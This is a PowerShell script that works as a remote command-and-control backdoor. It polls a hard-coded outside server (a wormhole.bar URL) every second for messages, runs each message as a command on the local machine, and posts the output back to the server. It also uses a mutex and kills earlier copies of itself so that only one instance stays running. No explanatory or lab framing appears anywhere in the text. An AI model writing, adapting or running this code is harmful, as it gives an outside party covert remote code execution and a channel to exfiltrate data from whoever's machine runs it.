param(
    [string]$Server = "https://023nfn.wormhole.bar"
)
$mutexName = "Global\MyUniqueScriptName_8f9a2b1c"
$createdNew = $false
$mutex = New-Object System.Threading.Mutex($false, $mutexName, [ref]$createdNew)

# 1. If another instance is running, find its process ID and terminate it
if (-not $createdNew) {
    $scriptName = [System.IO.Path]::GetFileName($PSCommandPath)
    
    # Find other PowerShell processes running this exact script filename
    $existingProcesses = Get-CimInstance Win32_Process | Where-Object {
        ($_.Name -match '^(powershell|pwsh)\.exe$') -and
        ($_.ProcessId -ne $PID) -and
        ($_.CommandLine -like "*$scriptName*")
    }

    foreach ($proc in $existingProcesses) {
        Stop-Process -Id $proc.ProcessId -Force -ErrorAction SilentlyContinue
    }
}

# 2. Wait until the old process dies and releases the mutex
try {
    [void]$mutex.WaitOne()
}
catch [System.Threading.AbandonedMutexException] {
    # Normal: triggers because the previous process was forcefully killed
}

try {
    
function Get-Reply([string]$text) {
	$name=$text
    try {
        $output = & $name | Out-String
        return $output.Trim()
    } catch {
        return "command failed: $name"
    }
}

$sent = New-Object 'System.Collections.Generic.HashSet[string]'
$since = 0

try {
    $msgs = Invoke-RestMethod -Uri "$Server/recv?since=$since" -Method Get
    foreach ($m in $msgs) { $since = $m.id }
} catch { }
while ($true) {
    try {
        $msgs = Invoke-RestMethod -Uri "$Server/recv?since=$since" -Method Get
        foreach ($m in $msgs) {
            $since = $m.id
            if ($sent.Contains($m.text)) { continue }

            $reply = Get-Reply $m.text
            [void]$sent.Add($reply)
            Invoke-RestMethod -Uri "$Server/send" -Method Post `
                -Body $reply -ContentType "text/plain; charset=utf-8" | Out-Null
        }
    } catch { }
    Start-Sleep -Seconds 1
}

}
finally {
    $mutex.ReleaseMutex()
    $mutex.Dispose()
}
